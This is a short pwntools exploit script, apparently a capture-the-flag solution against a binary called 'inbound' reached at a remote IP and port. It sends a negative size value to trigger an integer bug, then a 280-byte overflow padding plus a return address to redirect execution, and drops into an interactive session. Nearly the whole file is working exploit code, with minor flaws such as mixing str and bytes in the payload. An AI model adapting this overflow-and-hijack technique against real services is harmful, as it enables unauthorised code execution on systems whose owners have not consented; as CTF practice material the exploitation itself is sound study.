from pwn import *
elf_file = FILENAME = './inbound'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = b'34.170.146.252'
POST = 21083
#libc = ELF(b"./libc.so.6")
'''
HOST = b'localhost'
POST = 7777
libc = ELF(b"./libc.so.6")
#libc = ELF(b"./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  c = gdb.debug(FILENAME,gdbscript='''b main''')

c.sendlineafter(b"Size:",b"-2147483648")

payload = "a"*280 + p64(0x4011f6)

c.sendlineafter(b"Data:",payload)

c.interactive()
#gdb.attach(r)
